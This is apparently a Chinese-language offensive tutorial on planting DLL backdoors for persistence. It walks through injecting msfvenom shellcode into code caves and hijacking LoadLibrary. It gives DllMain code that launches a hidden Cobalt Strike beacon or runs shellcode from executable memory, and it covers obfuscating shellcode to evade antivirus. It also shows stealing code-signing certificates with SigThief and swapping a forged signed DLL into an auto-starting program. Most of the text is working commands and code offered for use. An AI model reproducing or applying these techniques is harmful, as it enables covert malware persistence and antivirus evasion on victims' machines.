# 文章优化版

## 概述
本文将详细讨论几种常见的DLL后门技术，包括代码注入、通用DLL劫持、以及通过证书签名伪造来实现持久化权限维持。文中会提供具体操作步骤及注意事项。

## 0x3.2 代码注入
### 1. 查找可用的代码洞穴（Cave）
首先，我们使用`./backdoor.py -f ./exeTest/TestDll.dll -s`命令来查找目标文件中的可用代码洞穴。
```
**************************************************
[*] Total of 2 caves found
```
在`.text`段中找到了一个大小为396字节的区域。

### 2. 获取可用Payload
运行`./backdoor.py -f ./exeTest/TestDll.dll -s`后，列出如下可用的payload：
- cave_miner_inline
- iat_reverse_tcp_inline
- iat_reverse_tcp_inline_threaded
- iat_reverse_tcp_stager_threaded
- iat_user_supplied_shellcode_threaded
- meterpreter_reverse_https_threaded
- reverse_shell_tcp_inline
- reverse_tcp_stager_threaded
- user_supplied_shellcode_threaded

我们选择`user_supplied_shellcode_threaded`作为自定义payload，并通过Metasploit生成shellcode：
- `msfvenom -p windows/exec CMD=calc.exe -f raw > calc.bin` (193 bytes)
- `msfvenom -p windows/messagebox -f raw > msg.bin` (272 bytes)

尝试注入payload：
```bash
./backdoor.py -f ./exeTest/TestDll.dll -s user_supplied_shellcode_threaded -U msg.bin -a
```

执行成功，但计算器弹出后主程序异常退出。这可能是由于暴力patch入口点导致堆栈不平衡所致。因此，效果不佳，建议等待新版本或自行学习堆栈原理进行优化。

## 0x3.3 通用DLL劫持
此方法无需导出相同的DLL接口，而是修改`LoadLibrary`返回值，从而劫持`LoadLibraryW(L"mydll.dll")`。

### 实现步骤
1. 使用工具[SuperDllHijack](https://github.com/anhkgg/SuperDllHijack)。
2. 克隆仓库并加载example部分：
   ```bash
   git clone https://github.com/anhkgg/SuperDllHijack.git
   ```

尽管成功hook了，但在获取导出函数时仍失败，且Release版本在Win10上无法运行。

## 0x3.4 总结
综合测试结果，推荐新手使用第一种方式。虽然导出函数较多时较繁琐，但利用微软提供的功能更为有效，可避免隐藏机制和系统版本问题。

## 0x4 DLL后门的利用
### 0x4.1 多文件利用方法
将CS木马beacon存放在隐蔽目录：
```bash
C:\Users\xq17\Desktop\shellcode\beacon.exe
attrib +h beacon.exe
```

使用DLL加载木马：
```c
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
        STARTUPINFO si = { sizeof(si) };
        PROCESS_INFORMATION pi;
        CreateProcess(TEXT("C:\\Users\\xq17\\Desktop\\shellcode\\beacon.exe"), NULL, NULL, NULL, false, 0, NULL, NULL, &si, &pi);
    }
    return TRUE;
}
```

这种方式免杀效果好，但需确保木马本身免杀。

### 0x4.2 单DLL自加载上线
直接将shellcode写入DLL中：
```c
BOOL WINAPI DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
{
    if (dwReason == DLL_PROCESS_ATTACH)
    {
        DisableThreadLibraryCalls(hModule);
        unsigned char buf[] = "shellcode";
        size_t size = sizeof(buf);
        char* inject = (char *)VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(inject, buf, size);
        CreateThread(0, 0, (LPTHREAD_START_ROUTINE)inject, 0, 0, 0);
    }
    else if (dwReason == DLL_PROCESS_DETACH)
    {
    }
    return TRUE;
}
```

静态扫描可过，但动态分析会被查杀。建议使用偏僻语言如Python、Golang等调用API来绕过杀软检测。

### Shellcode混淆
1. 使用`shikata_ga_nai`编码器进行内存XOR自解密。
2. 等价替换shellcode以去除特征码。

安装所需工具：
```bash
pip install distorm3
git clone https://github.com/kgretzky/python-x86-obfuscator.git
cd python-x86-obfuscator
```

生成混淆后的shellcode：
```bash
python x86obf.py -i payload.bin -o output.bin -r 0-184
```

进一步加强混淆：
```bash
python x86obf.py -i payload.bin -o output.bin -r 0-184 -p 2 -f 10
```

提取shellcode数组形式：
```python
#!/usr/bin/env python3
shellcode = 'unsigned char buf[] = "'
with open("output1.bin", "rb") as f:
    content = f.read()
for i in content:
    shellcode += str(hex(i)).replace("0x", "\\x")
shellcode += '";'
print(shellcode)
```

## 0x5 证书签名伪造
使用[SigThief](https://github.com/secretsquirrel/SigThief)伪造证书签名：
```bash
git clone https://github.com/secretsquirrel/SigThief.git
python3 sigthief.py -i VSTOInstallerUI.dll -t TestDll.dll -o TestDllSign.dll
```

## 0x6 实操DLL持久权限维持
### 步骤
1. 下载相关工具。
2. 在任务管理器->启动中查找自动启动的程序。
3. 使用ProcessMonitor监控加载的DLL。
4. 生成伪造的DLL文件并签名。
5. 替换原DLL文件。

例如，生成`Haozip_2345Upgradefake.dll`并伪造签名：
```bash
python3 sigthief.py -i Haozip_2345UpgradeOrg.dll -t Haozip_2345Upgradefake.dll -o Haozip_2345Upgrade.dll
```

将两个文件放回原目录。

## 0x7 总结
这种权限维持方案较为复杂，但通过自动化和备份主流软件的加载DLL列表，可以提高效率。建议深入研究简化指定DLL通用权限维持的方法。

## 0x8 参考链接
- [dll签名两种方法（转载）](https://blog.csdn.net/blacet/article/details/98631893)
- [给.DLL文件加一个数字签名的方法](https://www.cnblogs.com/zjoch/p/4583521.html)
- [Use COM Object hijacking to maintain persistence——Hijack explorer.exe](https://3gstudent.github.io/3gstudent.github.io/Use-COM-Object-hijacking-to-maintain-persistence-Hijack-explorer.exe/)
- [一种通用DLL劫持技术研究](https://www.t00ls.net/viewthread.php?tid=48756&extra=&highlight=dll&page=1)
- [th-DLL劫持](https://kiwings.github.io/2019/04/04/th-DLL%E5%8A%AB%E6%8C%81/)
- [利用BDF向DLL文件植入后门](https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8BDF%E5%90%91DLL%E6%96%87%E4%BB%B6%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8/)
- [劫持微信dll使木马bypass360重启上线维持权限](http://0x3.biz/2021/01/)
- [探索DLL搜索顺序劫持的原理和自动化侦查方法](https://www.anquanke.com/post/id/209563)